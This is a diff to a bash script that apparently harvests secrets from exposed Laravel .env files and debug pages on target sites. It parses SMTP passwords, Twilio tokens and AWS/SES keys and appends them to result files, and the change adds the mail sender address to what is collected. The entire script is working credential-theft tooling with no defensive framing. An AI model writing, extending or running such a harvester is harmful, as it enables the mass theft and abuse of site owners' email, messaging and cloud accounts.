@@ -52,6 +52,7 @@ host=$(echo "$ambilenv" | grep -Po 'MAIL_HOST=\K[^ ]+')
 mailport=$(echo "$ambilenv" | grep -Po 'MAIL_PORT=\K[^ ]+')
 mailname=$(echo "$ambilenv" | grep -Po 'MAIL_USERNAME=\K[^ ]+')
 mailpass=$(echo "$ambilenv" | grep -Po 'MAIL_PASSWORD=\K[^ ]+')
+from=$(echo "$ambilenv" | grep -Po 'MAIL_FROM_ADDRESS=\K[^ ]+')
 twilio1=$(echo "$ambilenv" | grep -Po 'TWILIO_SID=\K[^ ]+')
 twilio2=$(echo "$ambilenv" | grep -Po 'TWILIO_TOKEN=\K[^ ]+')
 twilio3=$(echo "$ambilenv" | grep -Po 'TWILIO_FROM=\K[^ ]+')
@@ -62,7 +63,7 @@ twilio3=$(echo "$ambilenv" | grep -Po 'TWILIO_FROM=\K[^ ]+')
                         MethodAws2;
         else
                         echo -e "${LB}[ENVVV][$tgl] ${NOR} ${TARGET}"
-                        echo "${TARGET}|$host|$mailport|$mailname|$mailpass" >> result/smtprandom.txt
+                        echo "${TARGET}|$host|$mailport|$mailname|$mailpass|$from" >> result/smtprandom.txt
                         echo "${TARGET}" >> cms/laravel.txt
         fi
         if [[ -z $twilio1 || $twilio1 =~ "null" ]]; then
@@ -111,10 +112,12 @@ TH=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>
 TP=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|MAIL_PORT" > kc.htm)
 TU=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|MAIL_USERNAME" > kd.htm)
 TS=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|MAIL_PASSWORD" > ke.htm)
+FM=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|MAIL_FROM_ADDRESS" > kf.htm)
 KTH=$(cat k.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
 KTP=$(cat kc.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
 KTU=$(cat kd.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
 KTS=$(cat ke.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
+KTF=$(cat kf.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
 SES1=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|AWS_ACCESS_KEY_ID\|AWS_KEY\|SES_KEY" > ses1.htm)
 SES2=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|AWS_SECRET_ACCESS_KEY\|AWS_SECRET\|SES_SECRET" > ses2.htm)
 SES3=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|AWS_SECRET_ACCESS_KEY\|AWS_REGION\|SES_REGION" > ses3.htm)
